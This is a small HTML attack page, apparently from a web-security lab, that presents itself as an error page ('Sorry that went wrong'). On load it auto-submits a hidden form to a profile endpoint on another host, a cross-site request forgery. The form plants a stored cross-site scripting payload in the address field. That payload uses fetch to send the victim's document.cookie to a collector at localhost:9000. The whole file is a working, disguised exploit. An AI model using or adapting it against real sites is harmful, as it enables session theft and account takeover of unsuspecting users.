<!DOCTYPE html>
<html>

<head>
    <title>Sorry that went wrong</title>
</html>

<body onload="document.forms[0].submit()">
    <form method="POST" action="http://eitf:8000/profile.php">
        <input type="text" name="home_address" value="<script>fetch('http://localhost:9000/?cookies='+ document.cookie,{method:'GET'})</script> Please re-enter your address" required>
        <button type="submit">Submit</button>
    </form>
</body>